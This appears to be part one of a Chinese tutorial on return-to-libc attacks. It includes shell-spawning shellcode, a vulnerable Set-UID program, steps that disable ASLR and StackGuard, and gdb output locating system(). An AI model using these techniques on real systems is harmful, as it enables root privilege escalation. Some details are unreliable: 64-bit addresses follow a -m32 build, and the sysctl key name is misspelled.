# Return to Libc 攻击之一

## 一、引言

在典型的栈缓冲区溢出攻击中，攻击者首先需要在目标栈中放置一段恶意代码，然后修改函数的返回地址，使得当函数返回时程序跳转到恶意代码在栈中的位置执行。我们可以使用的一种防御方法是让栈不可执行，这样即使攻击者能够使程序跳转到栈中的恶意代码，也不会造成任何破坏，因为恶意代码无法执行。

栈的主要目的是用来存储数据，很少需要在栈中运行代码。因此，大多数程序不需要可执行的程序栈。在一些体系架构中 (包括 x86)，可以在硬件层面将一段内存标记为不可执行。在 Ubuntu 系统中，如果使用 gcc 编译程序，**<font color="red">可以让 gcc 生成一个特殊的二进制文件，这个二进制文件的头部中有一个比特位，表示是否需要将栈设置为不可执行</font>**。当程序被加载执行时，操作系统首先为程序分配内存，然后检查该比特位，如果它被置位，那么栈的内存区域将被标记为不可执行。以下面的代码为例：

```c{.line-numbers}
#include <string.h>
// gcc -z execstack shellcode.c -o shellcode -m32
// 因为此 shellcode 只是单纯执行 exceve

const char code[] =
	"\x31\xc0\x50\x68//sh\x68/bin"
	"\x89\xe3\x50\x53\x89\xe1\x99"
	"\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
	char buffer[sizeof(code)];
	strcpy(buffer, code);
	((void(*)( ))buffer)( );
}
```

上述代码首先将 shellcode 二进制代码写入到缓冲区中，然后将缓冲区看成是一个函数，然后调用此函数，调用后会产生一个 shell。我们在编译时分别打开和关闭"禁止栈执行"选项：

```shell{.line-numbers}
monica@xvm:~/csapp/chapter3$ gcc -z execstack shellcode.c -o shellcode -m32
monica@xvm:~/csapp/chapter3$ ./shellcode 
$ 
# 以下命令让栈不可执行
monica@xvm:~/csapp/chapter3$ gcc -z noexecstack shellcode.c -o shellcode -m32
monica@xvm:~/csapp/chapter3$ ./shellcode 
段错误
```

execstack 是一个用于管理 ELF 可执行文件的栈执行权限的工具。在 Linux 系统中，栈通常默认是不可执行的（NX 保护），以防止缓冲区溢出攻击。通过 execstack，用户可以查看或修改二进制文件的栈执行权限。**`-s`** **选项设置栈为可执行，允许在栈上执行代码**；**`-c` 清除栈的可执行权限，启用 NX 保护，增强安全性**。因此，如果想改变一个已经编译好的程序的可执行栈比特位，可以使用 execstack。

```c{.line-numbers}
monica@xvm:~/csapp/chapter3$ execstack -c ./shellcode
monica@xvm:~/csapp/chapter3$ ./shellcode 
段错误
monica@xvm:~/csapp/chapter3$ execstack -s ./shellcode
monica@xvm:~/csapp/chapter3$ ./shellcode 
$ 
```

绕过防御措施：成功的缓冲区溢出攻击需要运行恶意代码，但这些代码不一定非要在栈中。鉴于攻击者只能注入数据(代码)到栈中，而随着栈变得不可执行，攻击者就无法再运行他们注入的代码，但他们可以想办法借助内存中已有的代码进行攻击。

**内存中有一个区域存放着很多代码，主要是标准 C 语言库函数。在 Linux 中，该库被称为 libc，它是一个动态链接库**。很多的用户程序都需要使用 libc 库中的函数，所以在这些程序运行之前，操作系统会将 libc 库加载到内存中。我们可以利用 libc 库中的 system 函数，这个函数接收一个字符串作为参数，将此字符串作为一个命令来执行。

```c{.line-numbers}
// The system() library function uses fork(2) to create a child process that executes the shell command specified in command using execl(3) 
// as follows:
// execl("/bin/sh", "sh", "-c", command, (char *) NULL);
// system() returns after the command has been completed.
// The return value of system() is one of the following:
#include <stdlib.h>
int system(const char *command);
```

上面是 system 函数的定义和介绍，system 函数会调用 fork 函数产生子进程，由子进程来执行 **`execl("/bin/sh", "sh", "-c", command, (char *) NULL);`** 函数进而执行 command 命令，命令执行完后随即返回原调用的进程。execl 函数要求开发者在调用中以字符串列表形式来指定参数，而不使用数组来描述 argv 列表。**<font color="red">首个参数对应于新程序 main() 函数的 `argv[0]`，因而通常与参数 filename 或 pathname 的 basename 部分相同</font>**。必须以 NULL 指针来终止参数列表，以便于各调用定位列表的尾部。

```c{.line-numbers}
int execl(const char* pathname, const char* arg, ... /*, (char*) NULL*/);
```

**`execl("/bin/sh", "sh", "-c", command, (char *) NULL);`** 函数执行效果等同于命令行 **`/bin/sh -c 'command'`**。有了 system 函数，如果想要在缓冲区溢出后运行一个 shell，无须自己编写 shellcode，只需要跳转到 system() 函数，让它来运行指定的 "/bin/sh" 程序即可。根据前面描述，等同于运行 **`/bin/sh -c '/bin/sh'`**。

```c{.line-numbers}
monica@xvm:~/csapp/chapter3$ /bin/sh -c '/bin/sh'
$
```

上述攻击策略就被称之为 return-to-libc 攻击方式，以下就是其基本的原理。

<div align="center">
    <img src="return_to_libc_static//1.png" width="450"/>
</div>

## 二、攻击实验

### 1.准备

我们准备的漏洞程序如下所示：

```c{.line-numbers}
/* This program has a buffer overflow vulnerability. */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int foo(char* str) {
    char buffer[100];

    /* the following statement has a buffer overflow problem. */
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv) {
    char str[400];
    FILE* badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 300, badfile);
    foo(str);

    printf("returned properly\n");
    return 1;
}
```

首先编译上述代码，在编译时，需要打开不可执行栈的同时，需要关闭 StackGuard 机制，另外还需要关闭地址空间布局随机化的机制。并且上述代码是一个 root 用户的 Set-UID 程序，因此它运行时具有 root 权限，这使得该程序称为攻击的目标。因此还需要执行命令，将程序变成一个以 root 为所有者的 Set-UID 程序。

```c{.line-numbers}
$ gcc -m32 -fno-stack-protector -z noexecstack -o stack stack.c
$ sudo sysctl -w kernel.randomize.va_space=0
$ sudo chown root stack
$ sudo chmod 4755 stack
```

这里的目标是跳转到 system() 函数，然后让它执行 **`/bin/sh`**。这相当于调用 **`system("/bin/sh")`**。为了实现这个目标，需要执行以下三个任务:

- 任务 A: 找到 **`system()`** 函数的地址。需要找到 **`system()`** 函数在内存中的地址，将有漏洞程序中的函数返回地址改成该地址，这样函数返回时程序就会跳转到 **`system()`** 函数。
- 任务 B: 找到字符串 **`/bin/sh`** 的地址。为使 **`system()`** 函数运行一个命令，命令的名字需要预先放在内存中，并且必须预先知道它的地址。
- 任务 C：**`system()`** 函数的参数。获取字符串 /bin/sh 的地址之后，需要将地址传给 **`system()`** 函数。**`system()`** 函数从栈中获取参数，这意味着字符串的地址需要放在栈中。

### 2.任务 A：找到 **system()** 函数地址

在 Linux 中，当一个需要使用 libc 的程序运行时，libc 函数库将被加载到内存中。**<font color="red">当 ASLR 关闭时，对同一个程序，这个函数库总是加载到相同的内存地址 (对不同程序，函数库在内存中的地址不一定相同)</font>**。因此，可以使用调试工具 (如 gdb) 轻易地找到 system() 函数在内存中的地址。也就是说，可以调试目标程序。即使程序是一个 root 所有的 Set-UID 程序，仍然可以调试它，虽然在调试时特殊权限会被丢弃 (即有效用户 ID 会被设置成和真实用户 ID 一致)。

>-q 表示 quiet mode，禁用 GDB 的启动信息，比如版权声明和提示符信息。启动后，会直接进入调试界面，而不会显示额外的说明性文本。

首先我们使用 gdb 调试之前没有使用 **`-g`** 选项编译的 stack 二进制程序，如下所示，可以得到 system 函数的地址 **`0x7ffff7c50d70`**，exit 函数的地址 **`0x7ffff7c455f0`**。

```c{.line-numbers}
monica@xvm:~/csapp/chapter3$ gdb stack -q
Reading symbols from stack...
(No debugging symbols found in stack)
(gdb) b  foo
Breakpoint 1 at 0x11d1
(gdb) r
Starting program: /home/monica/csapp/chapter3/stack 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555551d1 in foo ()
(gdb) p system
$1 = {int (const char *)} 0x7ffff7c50d70 <__libc_system>
(gdb) p exit
$2 = {void (int)} 0x7ffff7c455f0 <__GI_exit>
(gdb) 
```

接下来我们修改一下 foo 函数，stack 程序运行时打印出 system 函数与 exit 函数的地址。

```c{.line-numbers}
int foo(char* str) {

    char buffer[100];
    printf("%p %p\n", &system, &exit);
    /* the following statement has a buffer overflow problem. */
    strcpy(buffer, str);
    return 1;
}
```

打印出的地址如下所示，可以发现运行时 system 函数与 exit 函数的地址与使用 gdb 调试时的地址相同。

```c{.line-numbers}
monica@xvm:~/csapp/chapter3$ ./stack
0x7ffff7c50d70 0x7ffff7c455f0
段错误

```

需要注意的是，**<font color="red">对同一个程序，如果把它从 Set-UID 程序改成非 Set-UID 程序，libc 函数库加载的地址可能是不一样的</font>**，所以上述调试一定要使用有漏洞的 Set-UID 程序，否则得到的地址可能是不对的。

